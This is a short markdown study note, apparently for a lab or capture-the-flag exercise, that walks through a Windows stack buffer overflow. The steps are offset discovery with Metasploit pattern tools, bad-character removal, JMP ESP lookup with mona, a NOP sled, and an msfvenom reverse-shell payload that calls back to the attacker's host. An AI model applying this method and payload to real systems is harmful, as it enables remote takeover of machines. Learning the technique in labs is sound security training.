# Buffer Overflow

## Overflow One
1. Find Overflow point (offset)

* send alot of bytes over socket and see if the program crashes
* for the number of bytes sent run this script to determine the overflow point

* this metasploit script will give you a cyclically increasing list of bytes so you based off the register that broke you can 
determine on which byte did the overflow actually occur the offset

-l specifies how many bytes do you want it to be
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600
```

* once this is exicuted find the EIP(Extended Instruction Pointer) and copy the bytes that are there

throw those bytes in here
 ```bash
 /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb
 ```
and it will give you the exact offset

2. Remove bad characters

* depending on how the program was written some chars will mess up and code that you try to exicute
* after the offset send all of the possible bytes and then look at them in register

use this to generate list of all bytes in python

```python
bytearray(range(1, 256))
```

* when analysing them in the register you can see when the bytes get out of order, this is how you know its a bad byte
* keep a list of all the bad bytes so you can remove them from the msfvenom payload you generate, or any other code that you want to run

3. Create msfvenom payload

| Option   |      Description      |
|----------|:-------------:|
| -b |  specify bad bytes |
| -f |    specify format   | py is for python
| -v | the variable you want it outputed as (optional)|

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=9000 EXITFUNC=thread -b "\x00\x07\x2d\x2e\xa0" -f py -v shellcode
```

4. Find Jump Point

* This mona cmd locates the jump point

```bash
!mona jmp -r esp -cpb "\x00"
```
* this goes after the offset, where you want to go after you overflow the buffer

5. Add nop sled

* after the jump you might not land exactly where you think you may so you want some nothing to be in between the jump and you shellcode
* add nop sled after jump point

6. Add payload (shellcode)

* add shell code to the end of the payload
* send it over and make the reverse connection
